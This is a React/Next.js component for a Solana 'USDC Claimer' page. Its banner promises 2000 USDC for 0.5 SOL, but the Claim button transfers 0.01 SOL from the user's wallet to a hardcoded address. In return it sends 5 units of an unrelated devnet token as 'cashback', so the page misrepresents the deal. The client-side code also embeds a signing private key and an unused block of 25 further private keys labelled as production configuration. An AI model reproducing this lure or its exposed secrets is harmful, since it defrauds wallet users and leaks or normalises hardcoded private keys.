/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "319DDACnQ5B84DyCwhc2qts3s3bY4UULUnwjoM2WsDj72vFYyVLaV3v43y2evefHsYTyX3pdEFvpQG3pegSkz6s9"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "4TxnPd5q7PUAz2n64p6uq31ZDrt85kc35AwrfYEHDaJGAYpLRmnNFmAi3zkannCXvTnTznk4MfJ5PWVw67AzfKU9",
  "key1": "22udo7MmjghmEhr5qseAcvBC7PbFgL5pZmCwBNtWp1ZhaKNcM6SKQa4kGTjQapBf2TgY89fbSrjdM6Sx3hBnPdxi",
  "key2": "4cZVKJ65ZbbB1pr5SGs9HzuXqxcz4vNAajAL7va4EArNkeaic5g7hebmYqeCMMYALh1c9XwV5qTpbFxJjymGscut",
  "key3": "4jNWTRADh1L16MRFUZMwX2fGcCUp5J4k93HDc19kkqQHYTsE4qRYLbSPmtv2bfVy2tRMuRCsVvhmRiwmrBrLRKSV",
  "key4": "tnube91nTRBJB5MnJbM5ND2u7b6xjhWHSBLQHqY5WRKeVHcoCGpC64AaLdVJG2DkQ3eFoD7zHuGmYW4GbFHmxUa",
  "key5": "5Q4RMoQj6sko4ZPHBJFG2gjR75UVhqNXQHJgTwNZWPxszMpHQTVpgG6bwGrKWETdf5MiXRCin4pP8Ev9B4mjD9aP",
  "key6": "5CqxUeN4ed2xK2Bwe681VY2u2wfajsYyP8hWqtDH7532BsqzzzuQ7ycjKp2np3VqjnT2SS42jZnDUsk8rZpo8mPt",
  "key7": "4MRLxrZ6SdT1wiJdqr7bTV2GyeTRjefviB9CCGWXw2mBLvryBHAAXwkfgKaMZxW9CpsCEcBAow6cxX2cUtBnBgFx",
  "key8": "4SKwbwndBTQ7nFxsg8mZ76xPLiPBu3GMBWXGTmDsQicMVC6k83wHmSUtKQ7LnNc8sya4YirctDkrywqTqFdyXodQ",
  "key9": "5xy5iCJswDB1uLnHyTCcA2BMDWGFozuutzX1bwjSKfHidj9xF9u86EkGJ3TJTLawTXbTt1UGXuBSfz9BYNYqBN8J",
  "key10": "4EHttD4B2NqQWVS2VVcha3FxEpwpSkaPiYNJ9wnXxZCFi3JQ9FuvU54R7VbNL8bTSnotk15PDuUzCBpwxGRXnCYo",
  "key11": "3eRTwsiCFBuU1pvmWYW1Eu7X8ALq9hvkatoBpbC7aGayHH6Sp3ijRdKiZe26pyu4cjmmuxaQCQyiV29bHj9Fae2x",
  "key12": "2Rdg7o9JNRQshoRAcbqAyQzbNyzh1b6aonAhjfYQdxo65L2FofJr5C46goFCPTbBm8FmQNK8nauNZTesEFZNqeWo",
  "key13": "3viusaS6zeGioqZ9gcLogxUDTbNsZWD4P8Zms34E7be4MreT2MWSUNM1XEWNYM3HTb7HWRmWbzJcix1ygxqJabri",
  "key14": "3x1peSkcn6zxvvaSbL4XU1VpqXJYq7wbUdmaKukik9XkgrxL1Rf5J9Q9PwodYh6TvXwQBJK2a29ijGYoQYoJwxfz",
  "key15": "3vFUUik3D5VbmowNfodFs5kLnxqYtUw3DdwRJXez2e5xogEay7Y9dAQ5CxaQ7hfJ2kzTcZGSnogiRQrXXvFtonby",
  "key16": "5qfeXzqCYz76L5pY9HFeL7XYxAbj6u6phvKcD2sQcC157cTEhU6HCvTEw11FYhswgza8CcwV6cVU2XD7btGz2axH",
  "key17": "3RLUxcCfNfb59N17RsncgK3RHPxFn5YHCy76kCcFCoeMCVdmSyg5d6427YwDRURjhsJfoMXECSzzCaykvjjvptwN",
  "key18": "5ttpwmbWB1V5JF8yFpD6dGrKCEzNJa2A2sGsqR14Hi3TtNU5Mmoa7u5WSUX1wko7PPSLQ93mD33Wj3rqpdcKbcB9",
  "key19": "3arkZq1ogFd7axmaUcFZzuaQ3Bn72owLhjYhZSkZap82kkcH6PPxQCef2GEvjANVHxfvpPiPCRdzRdvV6LnVco6S",
  "key20": "5en1TqgwkreM4oWQmAkQLJkh5mauzRDEw9VVDrHrsD1X8184iGEJgHwVm5XtLAcdTg8nG74ztr5N4Zjfkf6S9RME",
  "key21": "3aUiNnM2zqEPnwhGZnqkXJaAuGCnV81udbRf4bmkppokzeWWBk2JjUYnV1saYxUDegmtMuu3hstZY97dCNbiEjrP",
  "key22": "5Bc7NMWpeChjvpEVrWtLbSFmpWkVR3Lz1XaTBiZrPxuLbihBnLqffFDrnjFPce2xTzVbN9tGn7NRf8KeuQH7tx4m",
  "key23": "5vb3qg9xTFB1cYRBzTWGFqAHTj7wHUcQjQcB8RLdvE8xJwjYfMWzn7kNq2c8qfMHEymWat6jmGSiD7XkTdgUEiXk",
  "key24": "3kwXzASHcb1HK5Scj5D4kAP4JkXZedNgi1GEDgtVDdnF7x6QDhpH6Hm76CCFRw6VNjUAdgmsJ6o8Qk6hePuYebvH"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
